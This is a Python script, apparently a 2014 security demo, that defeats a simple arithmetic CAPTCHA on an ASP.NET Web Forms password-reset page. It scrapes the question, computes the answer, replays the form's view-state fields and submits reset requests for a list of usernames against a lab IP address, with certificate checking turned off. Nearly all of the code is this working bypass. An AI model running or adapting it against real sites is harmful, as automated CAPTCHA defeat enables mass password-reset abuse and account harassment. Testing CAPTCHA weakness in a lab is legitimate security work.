__license__ = """

    MathCaptchaByPass.py is a free script to test the bypassing of a text-based math CAPTCHA.  Along with
    this script you will find an ASP .NET Web Forms site to test the script against.

    Author:  Rich Grimes
             Twitter:  @saltyCoder

    Copyright (C) 2014 by Rich Grimes

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""


class TextColors:
    FAIL = '\033[91m'
    END = '\033[0m'

    def disable(self):
            self.FAIL = ''
            self.END = ''

import re
import argparse


"""
Verify that Python 3 is installed
"""
import sys

if sys.version_info < (3, 0, 0):
    print('\n{0}Python 3 is needed to run this script.  Visit the Python download page to install Python 3:  '
          'https://www.python.org/downloads{1}'.format(TextColors.FAIL, TextColors.END))

    print('\n{0}Linux users can use:  apt-get install python3-requests{1}\n'.format(TextColors.FAIL, TextColors.END))

    exit(1)


"""
Lets make sure the Request library is installed (http://docs.python-requests.org/en/latest)
"""
try:
    import requests

except ImportError:
    print('\n{0}You will need to install the Python Requests library to run this script.  Visit '
          'the Python Request site for installation directions:  '
          'http://docs.python-requests.org/en/latest.{1}'.format(TextColors.FAIL, TextColors.END))
    exit(1)


def math_captcha_bypass(userName, url, proxy):

    try:

        from bs4 import BeautifulSoup
        from urllib.parse import urlparse

        # Create the Proxy Server.  Example:  {'http': 'http://127.0.0.1:8080'}
        o = urlparse(proxy)
        proxies = {o.scheme: o.geturl()}

        # Determine if we are using a proxy and make the HTTP Request
        if len(proxy) < 1:
            proxies = None

        # Establish Session and Make HTTP Request
        s = requests.Session()

        s.get(url, proxies=proxies, allow_redirects=True, verify=False)
        r = s.get(url, proxies=proxies, allow_redirects=True, verify=False)

        # Load Response into BeautifulSoup
        soup = BeautifulSoup(r.text)

        #print(soup.prettify())

        # Get the Math CAPTCHA Question
        str = soup.select('label[for="txtCaptcha"]')

        # Extract the numbers from the question
        n = []
        n = re.findall(r'\d+', str[0].text)

        answer = int(n[0]) + int(n[1])

        print('\nCaptcha:  {0}  {1}'.format(str[0].text, answer))

        # For the demo we are using ASP.NET Webforms so we must send the
        # view state and event validation fields in the POST Request
        viewState = soup.select('input[id="__VIEWSTATE"]')
        eventVal = soup.select('input[id="__EVENTVALIDATION"]')

        # Create the HTTP POST Body and send Request
        payload = {'__VIEWSTATE': viewState[0]['value'], '__EVENTVALIDATION': eventVal[0]['value'],
                   'UserName': userName, 'txtCaptcha': answer, 'Reset': 'Reset+Password'}

        r = s.post(url, proxies=proxies, data=payload, allow_redirects=True, verify=False)

        # Read the Response and display the demo message
        soup = BeautifulSoup(r.text)

        msg = soup.select('div[id="Message"]')

        if 'password' in msg[0].text:
            print('{0}{1} - {2}{3}'.format(TextColors.FAIL, userName, msg[0].text, TextColors.END))
        else:
            print('{0} - {1}'.format(userName, msg[0].text))

        # Close out session
        s.close()

    except ImportError:
        print("Import Error")


def main():

    url = 'http://192.168.61.128/captcha/'

    parse = argparse.ArgumentParser()
    parse.add_argument('-proxy', action='store', dest='proxy', required=False, help='Enter in the address of the proxy.  For example:  http://127.0.0.1:8080')

    args = parse.parse_args()

    proxy = str(args.proxy)

    userNames = ['DonaldDuck', 'MickeyMouse', 'JohnDoe', 'HappyGilmore']

    for p in userNames:
        math_captcha_bypass(p, url, proxy)


if __name__ == "__main__":
    main()
